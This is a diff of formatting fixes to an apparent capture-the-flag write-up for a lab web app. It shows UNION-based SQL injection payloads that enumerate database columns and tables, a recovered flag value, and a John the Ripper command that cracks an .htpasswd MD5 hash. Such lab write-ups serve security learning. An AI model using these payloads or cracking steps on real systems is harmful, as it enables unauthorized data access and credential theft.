@@ -33,29 +33,39 @@ this lists all columns of the table users, we're using hex because strings are b
 
 listing all columns gave us this :
 
-````
+```
 ID: 5 UNION SELECT NULL, column_name FROM information_schema.columns--
 First name:
 Surname : FLAG
-``` which is sus
+```
+
+which is sus
 
 but after finding the table that this columbs belong to
+
 ```
+
 ID: 5 UNION SELECT NULL, table_name FROM information_schema.columns WHERE column_name=0x464C4147--
 First name:
 Surname : INNODB_SYS_TABLES
+
 ```
 
 and trying to get FLAG from it
 
 ```
+
 5 UNION SELECT NULL, FLAG FROM INNODB_SYS_TABLES--
-```
-we get
-```
-Table 'Member_Sql_Injection.INNODB_SYS_TABLES' doesn't exist
+
 ```
 
+we get
+
+```
+
+Table 'Member_Sql_Injection.INNODB_SYS_TABLES' doesn't exist
+
+```
 
 ### Flag 02 1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0
 
@@ -100,7 +110,7 @@ To crack the password from the `.htpasswd` file using John the Ripper, run the f
 
 ```bash
 ../john/run/john --format=Raw-MD5 htpasswd
-````
+```
 
 gives us
 
